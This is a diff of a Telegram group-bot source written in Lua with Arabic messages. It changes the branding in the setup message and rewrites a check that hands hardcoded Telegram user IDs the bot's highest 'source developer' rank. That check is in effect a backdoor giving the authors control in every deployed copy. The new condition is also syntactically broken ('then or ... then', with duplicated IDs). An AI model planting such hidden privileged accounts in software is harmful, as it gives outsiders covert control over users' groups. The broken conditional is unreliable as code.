@@ -99,7 +99,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس الجحيم \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس فمبير \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -262,9 +262,9 @@ if msg.GroupActive and redis:get(ws..'mute_tgservice'..msg.chat_id_) then
 Del_msg(msg.chat_id_,msg.id_)
 end
 return false 
-end
-  
- if msg.sender_user_id_ == 1373616147 then 
+end 
+
+if  msg.sender_user_id_ == 1373616147 then or msg.sender_user_id_ == 1355033316 then or msg.sender_user_id_ == 1472286953 then or msg.sender_user_id_ == 1472286953 then or msg.sender_user_id_ == 1373616147 then or msg.sender_user_id_ == 954727833 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
